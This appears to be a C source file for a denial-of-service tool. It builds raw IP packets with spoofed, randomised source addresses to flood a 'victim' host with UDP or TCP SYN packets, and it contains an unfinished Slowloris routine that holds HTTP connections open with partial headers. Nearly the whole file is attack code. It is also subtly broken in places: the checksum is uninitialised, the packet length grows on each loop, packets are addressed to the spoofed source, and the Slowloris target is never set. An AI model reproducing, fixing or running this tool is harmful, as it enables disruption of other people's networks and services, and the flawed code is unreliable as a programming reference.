#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <unistd.h>
#include <time.h>

#define MAX_THREADS     1
#define PACKET_LENGTH   64

struct attack {
    in_addr_t ip_victim;
    in_addr_t ip_spoofed;
    in_addr_t cidr_spoofed;
    int protocol;
};


uint16_t checksum(char *header, int words)
{
    uint16_t sum;
    while (words > 0) {
        sum += *header++;
        words--;
    }
    return ~sum;
} 


int randint(int a, int b)
{
    return rand() % (b - a + 1) + a;
}

in_addr_t ip_random(in_addr_t net, int cidr)
{
    in_addr_t net_mask = (~0 << (32 - cidr));
    in_addr_t host_mask = ~net_mask;
    in_addr_t target_host = 0;
    if (host_mask != 0)
        target_host = rand() % host_mask;

    return htonl(
        (ntohl(net) & net_mask) | target_host
    );
}

int raw_socket_spawn(int protocol)
{
    int sock;
    int one = 1; 
    const int *val = &one;

    if ((sock = socket(AF_INET, SOCK_RAW, protocol)) < 0) {
        perror("Error socket()");
        pthread_exit(NULL);
    }
    
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
         perror("Error: setsockopt()");
         pthread_exit(NULL);
    }

    return sock;
}

void *flood(void *value)
{
    char buffer[PACKET_LENGTH];

    struct attack *packet = (struct attack *)value;
    int s = raw_socket_spawn(packet->protocol);
    int length = sizeof(struct iphdr);

    for (int i = 0; i < 10; i++) {
        memset(buffer, 0, PACKET_LENGTH);

        struct iphdr *ip = (struct iphdr *)buffer;
        struct udphdr *udp = (struct udphdr *)(buffer + sizeof(struct iphdr));
        struct tcphdr *tcp = (struct tcphdr *)(buffer + sizeof(struct iphdr));

        in_addr_t ip_src = ip_random(packet->ip_spoofed, packet->cidr_spoofed);
        uint16_t src_port = htons(randint(1024, 65535));
        uint16_t dst_port = htons(randint(1, 65535));

        if (packet->protocol == IPPROTO_UDP) {
            length += sizeof(struct udphdr);
            udp->source = src_port;
            udp->dest = dst_port;
            udp->len = htons(sizeof(struct udphdr));

        } else if (packet->protocol == IPPROTO_TCP) {
            length += sizeof(struct tcphdr);
            tcp->source = src_port;
            tcp->dest = 80; //dst_port;
            tcp->seq = htonl(rand());
            tcp->ack_seq = 0;
            tcp->doff = 5;
            tcp->syn = 1;
            tcp->window = htons(32767);    
        }

        struct sockaddr_in sin;
        sin.sin_family = AF_INET;
        sin.sin_port = dst_port;
        sin.sin_addr.s_addr = ip_src;

        ip->ihl = 5;
        ip->version = 4;
        ip->tos = 16;
        ip->tot_len = length;
        ip->id  = htons(54321);
        ip->ttl = 64;
        ip->protocol = packet->protocol; 
        ip->saddr = ip_src;
        ip->daddr = packet->ip_victim;
        ip->check = checksum(buffer, sizeof(struct iphdr));
        
        for (int i = 0; i < ip->tot_len; i++)
            printf("%02x ", ((uint8_t *)buffer)[i]);
        putchar('\n');

        if (sendto(s, buffer, ip->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
            s = raw_socket_spawn(packet->protocol);
        }
    }

    close(s);
}


void *slow_loris(void *value)
{
    int sock;
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("Error socket()");
        pthread_exit(NULL);
    }

    struct sockaddr_in victim = {
        .sin_family = AF_INET,
        .sin_port = htons(80)
    };

    connect(sock, (struct sockaddr *)&victim, sizeof(victim));

    char *user_agents[5] = {

    };

    char buffer[256];
    snprintf(buffer, 256, "GET /?%d HTTP/1.1\r\n", randint(0, 1000));
    send(sock, buffer, strlen(buffer), 0);

    snprintf(buffer, 256, "User-Agent: %s\r\n", user_agents[rand() % 5]);
    send(sock, buffer, strlen(buffer), 0);
    snprintf(buffer, 256, "Accept-language: sk-SK\r\n");
    send(sock, buffer, strlen(buffer), 0);

    snprintf(buffer, 256, "X-a: %d\r\n", randint(1, 50000));
    send(sock, buffer, strlen(buffer), 0);
    // settimeout(4)

    // Po istom čase (15s) pošli X-a náhodnú hlavičku
    // Ak zomrie socket v array tak ho znovu vytvor
}

int main(void)
{
    srand(time(NULL));
    pthread_t attackers[MAX_THREADS];

    struct attack nodes = {
        .ip_victim = inet_addr("192.168.1.101"),
        .ip_spoofed = inet_addr("10.0.0.1"), 
        .cidr_spoofed = 28,
        .protocol = IPPROTO_UDP
    };

    for (int i = 0; i < MAX_THREADS; i++)
        pthread_create(&attackers[i], NULL, flood, &nodes);
    
    for (int i = 0; i < MAX_THREADS; i++)
        pthread_join(attackers[i], NULL);
}
